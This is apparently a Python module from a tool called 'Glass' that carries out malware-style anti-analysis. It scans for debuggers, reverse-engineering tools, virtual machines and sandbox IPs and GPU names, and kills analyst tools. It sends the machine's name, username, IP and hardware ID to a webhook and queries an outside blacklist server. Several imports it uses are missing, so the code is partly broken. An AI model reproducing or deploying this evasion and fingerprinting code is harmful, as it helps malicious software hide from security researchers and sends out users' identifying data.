import os
import requests
import subprocess
import platform

from win32gui import GetWindowText, EnumWindows
from win32process import GetWindowThreadProcessId
from psutil import Process, process_iter, virtual_memory, cpu_count
from threading import Thread
from requests import get
from os import system, path, environ
from winreg import HKEY_LOCAL_MACHINE, OpenKey, CloseKey, QueryValueEx


def watchdog():
    checks = [check_windows, check_ip, check_registry,
              check_dll, check_specs, check_vm, check_gpus, platform_check, kernel_debug, checkblacklist]
    for check in checks:
        Thread(target=check, daemon=True).start()


def exit_program(reason, process=None):
    log.failure(reason)
    reportdebug(reason, process)

    os._exit(0)


def check_windows():
    def winEnumHandler(hwnd, ctx):
        if GetWindowText(hwnd).lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnSpy',
                                           'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly',
                                           'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor',
                                           'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process',
                                           'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview',
                                           'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump',
                                           'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb',
                                           'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper',
                                           'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek',
                                           'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug',
                                           'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO',
                                           'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id',
                                           'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper',
                                           'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker',
                                           'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide',
                                           'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer',
                                           'http toolkit', "Fiddler", "fiddler", 'ida64', 'ida32', 'ida', 'ida pro', 'ida pro -', }:
            pid = GetWindowThreadProcessId(hwnd)
            if type(pid) == int:
                try:
                    Process(pid).terminate()
                except:
                    pass
            else:
                for process in pid:
                    try:
                        Process(process).terminate()
                    except:
                        pass
            exit_program(f'Debugger Present', "window")

    while True:
        EnumWindows(winEnumHandler, None)


def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162',
                   '195.181.175.105', '194.154.78.160', '', '109.74.154.92', '88.153.199.169', '34.145.195.58',
                   '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25',
                   '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201',
                   '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59',
                   '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116',
                   'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130',
                   '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151',
                   '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107',
                   '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144',
                   '23.128.248.46', '84.147.54.113', '34.253.248.228', None}
    while True:
        try:
            ip = get('https://api64.ipify.org/').text.strip()
            if ip in blacklisted:
                exit_program(f'Blacklisted IP', "ip")
            return
        except:
            pass


def check_vm():
    processes = ['VMwareService.exe', 'VMwareTray.exe']
    for proc in process_iter():
        if proc.name() in processes:
            exit_program('Detected VM', "process")


def check_registry():
    if system(
        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and \
        system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1:
        exit_program('Detected VM')
    handle = OpenKey(HKEY_LOCAL_MACHINE,
                     'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]:
            exit_program('Detected VM', "registry")
    finally:
        CloseKey(handle)


def check_dll():
    if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(
            path.join(environ["SystemRoot"], "vboxmrxnp.dll")):
        exit_program('Detected VM', "dll")


def check_specs():
    if int(str(virtual_memory()[0] / 1024 / 1024 / 1024).split(".")[0]) <= 4:
        exit_program('RAM Amount Invalid', "ram")
    if int(cpu_count()) <= 1:
        exit_program('CPU Amount Invalid', "cpu")


def get_hwid():
    try:
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            winuser = os.getlogin()
            sid = win32security.LookupAccountName(None, winuser)[0]
            hwid = win32security.ConvertSidToStringSid(sid)
            return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber",
                                      stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid
    except Exception as e:
        return "None"


def check_gpus():
    try:
        gpus = [
            "NVIDIA GeForce 9500 GT (Microsoft Corporation - WDDM v1.1)",
            "Стандартный VGA графический адаптер",
            "Microsoft Remote Display Adapter",
            "Microsoft Basic Display Adapter",
            "Standard VGA Graphics Adapter",
            "ASPEED Graphics Family(WDDM)",
            "Intel(R) HD Graphics 4600",
            "Microsoft Hyper-V Video",
            "VirtualBox Graphics Adapter",
            "NVIDIA GeForce 9400M",
            "NVIDIA GeForce 840M",
            "AMD Radeon HD 8650G",
            "VMware SVGA 3D",
            "UKBEHH_S",
            "H_EDEUEK",
            "5LXPA8ES",
            "9SF72FG7",
            "YNVLCUKZ",
            "W1TO6L3T",
            "K9SC88UK",
            "M5RGU9RY",
            "PC1ESCG3",
            "6BOS4O7U",
            "LD8LLLOD",
            "H1_SDVLF",
            "7TB9G6P7",
            "HP8WD3MX",
            "CWTM14GS",
            "OEFUG1_W",
            "DE92L2UN",
            "P9T_AU3X",
            "XMX85CAL",
            "KBBFOHZN",
            "KOD68ZH1",
            "R69XK_H3"
        ]
        GPU = (
            subprocess.check_output(
                r"wmic path win32_VideoController get name",
                creationflags=0x08000000,
            )
            .decode()
            .strip("Name\n")
            .strip()
        )
        for gpu in gpus:
            if gpu in GPU.split("\n"):
                exit_program('Detected VM', "gpu")
    except:
        pass


def platform_check():
    try:
        PLATFORMS = [
            "Windows-XP-5.1.2600-SP2",
            "Microsoft Windows Server 2022 Standard Evaluation",
            "\xd0\x9f\xd1\x80\xd0\xbe\xd1\x84\xd0\xb5\xd1\x81\xd1\x81\xd0\xb8\xd0\xbe\xd0\xbd\xd0\xb0\xd0\xbb\xd1\x8c\xd0\xbd\xd0\xb0\xd1\x8f"
        ]

        PLATFORM = str(platform.version())

        if PLATFORM in PLATFORMS:
            exit_program(
                'Detected VM', "platform")
    except:
        pass


def reportdebug(reason, process=None):
    try:
        hwid = get_hwid()
        webhook = ""
        pcname = os.getenv('COMPUTERNAME')
        username = os.getenv('username')
        ip = get('https://api64.ipify.org/').text.strip()
        if ip == None:
            ip = "None"
        key = json.loads(
            open("assets/config/config.json", "r").read())["glass_key"]
        if key == "":
            key = "None"
        embed = {
            "title": "Debugger Detected",
            "description": f"Debugger detected on {pcname} ({username})\nIP: {ip}\nGlass Key: {key}\n Reason: {reason}\n Process: {process}\nHWID: {hwid}",
            "color": 16711680,
            "footer": {
                "text": "Glass"
            }
        }

        idk = requests.post(webhook, json={"embeds": [embed]})
    except Exception as e:
        pass


def kernel_debug():
    try:

        kernel32 = ctypes.windll.kernel32
        is_debugged = kernel32.IsDebuggerPresent()
        if is_debugged:
            exit_program('Debugger Detected', "kernel")
    except:
        pass


def checkblacklist():
    try:
        hwid = get_hwid()
        pcname = os.getenv('COMPUTERNAME')
        username = os.getenv('username')
        ip = get('https://api64.ipify.org/').text.strip()
        if ip == None:
            ip = "None"
        key = json.loads(
            open("assets/config/config.json", "r").read())["glass_key"]
        if key == "":
            key = "None"

        checks = requests.get(
            "https://api.vexhub.dev/auth/blacklist?hwid=" + hwid + "&ip=" + ip)
        if checks.status_code != 200:
            return
        jsondata = checks.json()


        if jsondata["ip"] and jsondata["hwid"]:
            exit_program('Both IP and HWID Blacklisted', "blacklist")
        elif jsondata["ip"]:
            exit_program('Blacklisted IP', "blacklist")
        elif jsondata["hwid"]:
            exit_program('Blacklisted HWID', "blacklist")
    except Exception as e:
        pass
